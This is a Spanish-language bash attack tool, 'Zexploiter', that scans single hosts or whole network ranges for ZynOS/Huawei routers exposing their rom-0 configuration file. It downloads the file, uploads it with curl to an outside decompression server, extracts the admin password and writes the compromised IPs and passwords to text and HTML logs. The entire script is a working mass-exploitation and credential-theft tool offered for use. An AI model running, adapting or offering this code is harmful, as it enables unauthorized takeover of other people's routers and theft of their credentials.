#!/bin/bash
# http://hikari.sytes.net
# Este script utiliza; wget, curl.
# Acutalmente el sevidor de donde se descomprimian los archivos esta fuera de servicio 
# http://50.57.229.26/decoded.php, este script depende de el, si routerpwn lo vuelve a poner en linea
# solo modifica las variables locales "decompressorurl" y "name" en la funcion romuploader().

## FUNCIONES PARA EL MENU ##

function graphic(){
	echo "                                        ,,           ,,";
	echo "MMM\"\"\"AMV                             \`7MM           db   mm";
	echo "M'   AMV                                MM                MM";
	echo "'   AMV    .gP\"Ya \`7M'   \`MF'\`7MMpdMAo. MM  ,pW\"Wq.\`7MM mmMMmm .gP\"Ya \`7Mb,od8";
	echo "   AMV    ,M'   Yb  \`VA ,V'    MM   \`Wb MM 6W'   \`Wb MM   MM  ,M'   Yb  MM' \"'";
	echo "  AMV   , 8M\"\"\"\"\"\"    XMX      MM    M8 MM 8M     M8 MM   MM  8M\"\"\"\"\"\"  MM";
	echo " AMV   ,M YM.    ,  ,V' VA.    MM   ,AP MM YA.   ,A9 MM   MM  YM.    ,  MM";
	echo "AMVmmmmMM  \`Mbmmd'.AM.   .MA.  MMbmmd'.JMML.\`Ybmd9'.JMML. \`Mbmo\`Mbmmd'.JMML.";
	echo "                               MM";
	echo "--Coded by hikari            .JMML.";
	echo "";
}

function wd(){ read -p "[?] Nombre del directorio donde se guardara la informacion: " workingdirectory ;}

function ni(){ read -p "[?] Introduce el netID de la IP (xxx.xxx.xxx): " netid ;}

function menu(){
	while [ true ]
	do
		clear
		graphic
		echo "[1] Escanear una direccion IP"
		echo "[2] Escanear un segmento de red"
		echo "[3] Escanear una red completa"
		echo "[4] Sobre este script"
		echo "[5] Salir"
		if [ $UID -ne 0 ] ; then
			read -p " $  " opt
		else
			read -p " #  " opt
		fi
		case $opt in
		1)
			read -p "[?] Introduce la direccion IP: " ipaddr
			wd
			[ -d "$workingdirectory" ] || mkdir "$workingdirectory" ; cd "$workingdirectory"
			engine $ipaddr
		;;
		2)
			ni
			read -p "[?] Iniciar escaneo desde el hostID (xxx): " start
			read -p "[?] Terminar escaneo en el hostID (xxx): " finish
			wd
			[ -d "$workingdirectory" ] || mkdir "$workingdirectory" ; cd "$workingdirectory"
			engine $start $finish
		;;
		3)
			ni ; wd
			[ -d "$workingdirectory" ] || mkdir "$workingdirectory" ; cd "$workingdirectory"
			start=1 ; finish=254
			engine $start $finish
		;;
		4)
		echo '[!] Creador: hikari ( http://hikari.sytes.net )                                                '
		echo '[!] Herramientas externas: ZynOS (Huawei) Configuration Decompressor ( http://routerpwn.com )  '
		echo '[!] Este script utiliza los siguientes binarios: wget, curl.                                   '          
		read -p "[!] Presiona [Enter] para continuar..."
		;;
		5) clear ; exit ;;
		*) echo "[!] No se reconoce esa opcion, presiona [Enter] para intentar de nuevo..." ; read ;;
		esac
	done
}

## FUNCIONES PARA ESCANEO, DESCARGA, DESCOMPRESION Y PARSEO ##

# romuploader(): Se sube el rom-0 a routerpwn.com y se guarda el resultado de la descompresion en formato TEXTO/HTML en el archivo temporal "decodedrom.XXXXXX".
function romuploader(){
	local decompressorurl="http://198.61.167.113/zynos/decoded.php"
	local name="uploadedfile" # Este es el nombre del valor del atributo "name" en el tag <input> dentro del codigo fuente de la pagina en routerpwn, se nesecita para subir archivos con cURL. 
	local filetoupload=$TMPFILEROM # El archivo que se quiere subir para descomprimir.
	curl "$decompressorurl" -F "$name"=@"$filetoupload" -o "$TMPFILEDECODED" 2> /dev/null
}

# formatter(): Teniendo el archivo temporal "decodedrom.XXXXXX" se procese a seleccinar solo el texto que se quiere.
function formatter(){
	if [ $criteria -eq 2 ]
	then
		ip=$netid.$i
	else
		ip=$ipaddr
	fi
	devicesinfodir="informacion_de_dispositivos"
	local nlines=0
	local starterline=0
	local finishline=0
	local decompressedfile=$TMPFILEDECODED
	local datalinescounter=0
	# Lineas que se quieren limpiar del archivo "decodedrom".
	local firstpattern='<h3>spd.dat strings:</h3><textarea cols=80 rows=10>'
	local lastpattern='</textarea></div></h2>'
	[ -d $devicesinfodir ] || mkdir $devicesinfodir
	echo "Informacion descomprimida:" > $devicesinfodir/$ip-info.txt
	while read line
	do
		nlines=$((nlines + 1))
		case $line in $firstpattern*) starterline=$nlines ;; esac
		case $line in $lastpattern) finishline=$nlines ;; esac
		if [[ ($starterline -ne 0) && ($finishline -eq 0) ]]
		then
			datalinescounter=$(($datalinescounter + 1))
			case "$line" in
			$firstpattern*)
				line=$(echo "$line" | sed -e "s|$firstpattern||")
				ipid[$romcounter]=$ip
				password[$romcounter]=$line
			;;
			esac
			if [ $datalinescounter -eq 2 ]
			then
				echo "--------- Mas informacion ---------" >> $devicesinfodir/$ip-info.txt
				echo "$line" >> $devicesinfodir/$ip-info.txt
			else
				if [ $datalinescounter -eq 1 ]
				then
					echo "Password del usuario admin: $line" >> $devicesinfodir/$ip-info.txt
				else
					echo "$line" >> $devicesinfodir/$ip-info.txt
				fi
			fi
		fi
	done < $decompressedfile
}

# scanner(): Hace ping a cada IP, intenta descargar, comprueba el archivo, luego procede segun el resultado.
function scanner(){
	ping -w2 -c2 $ip > /dev/null
	local retorno_ping=$?
	if [ $retorno_ping -eq 0 ]
	then
		onlinedevices=$(($onlinedevices + 1))
		echo "[+] $ip esta online, procediendo a descargar rom-0..."
		TMPFILEROM=$(mktemp $TMPDIR/rom-0.XXXXXX) 
		wget -O $TMPFILEROM --timeout 2 --tries 2 $ip/rom-0 2> /dev/null
		local retorno_wget=$?
		if [[ $retorno_wget -eq 0 && -e $TMPFILEROM ]]
		then
			if [ $(stat -c %s $TMPFILEROM) -eq 16384 ] # Archivos de configuracion pesan exactamente 16384 Kb
			then
				romcounter=$(($romcounter + 1))
				echo "[+] $ip vulnerado, procediendo a subir y descomprimir rom-0..."
				TMPFILEDECODED=$(mktemp $TMPDIR/decoded.XXXXXX)
				romuploader
				formatter
				echo "[+] $ip PWN3D! usuario: admin, password: ${password[$romcounter]}."
			else
				echo "[-] $ip no es un dispositivo vulnerable..."
			fi
		else
			echo "[-] $ip no es un dispositivo vulnerable..."
		fi
	else
		echo "[-] $ip no esta online..."
	fi
}

# engine(): Se escanean las IP, se descarga el rom-0 para luego subirlo y descomprimirlo usando la funcion romuploader luego se parcea el resultado con romformatter.
function engine(){
	criteria=$#
	TMPDIR=$(mktemp -dt zexploiter.XXXXXX)
	iplog=0
	romcounter=0
	onlinedevices=0
	tiempo_inicio=$(date +%r)
	clear
	echo -e "[!] Iniciando ataque @ $(date -R)"
	if [ $criteria -eq 2 ]
	then
		start=$1
		finish=$2
		for  (( i=$start ; i<=$finish ; i++ ))
		do
			iplog=$(($iplog + 1))	
			ip=$netid.$i
			scanner
		done
	else
		iplog=1
		ip=$ipaddr
		scanner
	fi
	echo "[!] El escaneo ha finalizado con $romcounter dispositivo(s) vulnerado(s)."
	tiempo_final=$(date +%r)
	makelog $1 $2
}

## FUNCIONES PARA EL REGISTRO(CREACION DE LOGS) ##

# text(): Se crea un archivo de texto para mostrar los resultados del escaneo.
function text(){
	echo "Numero de direcciones IP escaneadas: $iplog" > zexploiterlog.txt
	echo "Numero de dispositivos online: $onlinedevices" > zexploiterlog.txt
	echo "Numero de dispositivos vulnerados: $romcounter" >> zexploiterlog.txt
	echo "Fecha de escaneo: $(date +%D)" >> zexploiterlog.txt
	echo "Hora de inicio de escaneo: $tiempo_inicio" >> zexploiterlog.txt
	echo -e "Hora de final de escaneo: $tiempo_final \n" >> zexploiterlog.txt
	for(( k=1 ; k<=$romcounter ; k++))
	do
		echo "#$k ${ipid[$k]} usuario:admin password:${password[$k]}" >> zexploiterlog.txt
	done
	echo -e "\nhttp://hikari.sytes.net" >> zexploiterlog.txt
	echo "http://routerpwn.com" >> zexploiterlog.txt
}

# html(): Se crea un archivo HTML para mostrar los resultados del escaneo.
function html(){
	echo "<!DOCTYPE HTML>" > zexploiterlog.htm
	echo "<html>" >> zexploiterlog.htm
	echo "<head>" >> zexploiterlog.htm
	echo "<title>Zexploiter HTML Log</title>" >> zexploiterlog.htm
	echo "</head>" >> zexploiterlog.htm
	echo "<body bgcolor=\"000000\" text=\"00FF00\">" >> zexploiterlog.htm
	echo "<div align=\"center\">" >> zexploiterlog.htm
	echo "<br>" >> zexploiterlog.htm
	echo "<a href=\"http://hikari.site40.net/bashscripting.htm#zexploiter\" target=\"_blank\"><h1>Zexploiter 1.0</h1></a>" >> zexploiterlog.htm
	echo "<font color="yellow"><h3> HTML Log </h3></font>" >> zexploiterlog.htm
	echo "<p>Numero de direcciones IP escaneadas: $iplog <br>" >> zexploiterlog.htm
	echo "Numero de dispositivos online: $onlinedevices <br>" >> zexploiterlog.htm
	echo "Numero de dispositivos vulnerados: $romcounter <br>" >> zexploiterlog.htm
	echo "Fecha de escaneo: $(date +%D) <br>" >> zexploiterlog.htm
	echo "Hora de inicio de escaneo: $tiempo_inicio <br>" >> zexploiterlog.htm
	echo "Hora de final de escaneo: $tiempo_final </p>" >> zexploiterlog.htm
	echo "<font color=\"yellow\"><h3>Registro de dispositivos comprometidos: </h3></font>" >> zexploiterlog.htm
	echo "<p><a href=\"zexploiterlog.txt\" target=\"_blank\">Version en texto</p></a>" >> zexploiterlog.htm
	echo "<table border=\"1\" bordercolor=\"red\">" >> zexploiterlog.htm
	echo "<tr>" >> zexploiterlog.htm
	echo "<td>#</td><td>IP</td><td>Usuario</td><td>Password</td></font>" >> zexploiterlog.htm
	echo "</tr>" >> zexploiterlog.htm
	for(( k=1 ; k<=$romcounter ; k++))
	do
		echo "<tr>" >> zexploiterlog.htm
		echo "<td><a href=\"http://${ipid[$k]}:80\" target=\"_blank\">$k</></td><td><a href=\"$(readlink -f $devicesinfodir/${ipid[$k]}-info.txt)\" target=\"_blank\">${ipid[$k]}</a></td><td>admin</td><td>${password[$k]}</td>" >> zexploiterlog.htm
		echo "</tr>" >> zexploiterlog.htm
	done
	echo "</table>" >> zexploiterlog.htm
	echo "<p><i>" >> zexploiterlog.htm
	echo "<a href=\"http://twitter.com/imhikari\" target=\"_blank\">hikari</a><br>" >> zexploiterlog.htm
	echo "<a href=\"http://routerpwn.com\" target=\"_blank\">routerpwn</a><br>" >> zexploiterlog.htm
	echo "</i></p>" >> zexploiterlog.htm
	echo "</div>" >> zexploiterlog.htm
	echo "</body>" >> zexploiterlog.htm
	echo "</html>" >> zexploiterlog.htm
}

# makelog(): Pregunta por la creacion de un log de html y de texto.
function makelog(){
	while [ true ]
	do
		read -p "[?] Crear registro en formato HTML (s/n): " htmlog
		case $htmlog in
			"s" | "S")
				html ; text
				[ -e zexploiterlog.htm ] && echo "[!] Se ha creado el log de html satisfactoriamente." || echo "[!] Hubo un problema creando el log de html."
				[ -e zexploiterlog.txt ] && echo "[!] Se ha creado el log de texto satisfactoriamente." || echo "[!] Hubo un problema creando el log de texto."
				read -p "[!] Presiona [Enter] para salir..."
				clear
				exit
			;;
			"n" | "N" )
				while [ true ]
				do
					read -p "[?] Crear registro en formato de texto (s/n): " textlog
					case $textlog in
					"s" | "S")
						text
						[ -e zexploiterlog.txt ] && echo "[!] Se ha creado el log de texto satisfactoriamente." || echo "[!] Hubo un problema creando el log de texto."
						read -p "[!] Presiona [Enter] para salir..."
						clear
						exit
					;;
					"n" | "N") exit ;;
					*) echo "[!] No se reconoce esa opcion, intenta de nuevo..." ;;
					esac
				done
			;;
			*) echo "[!] No se reconoce esa opcion, intenta de nuevo..." ;;
		esac
	done
}

menu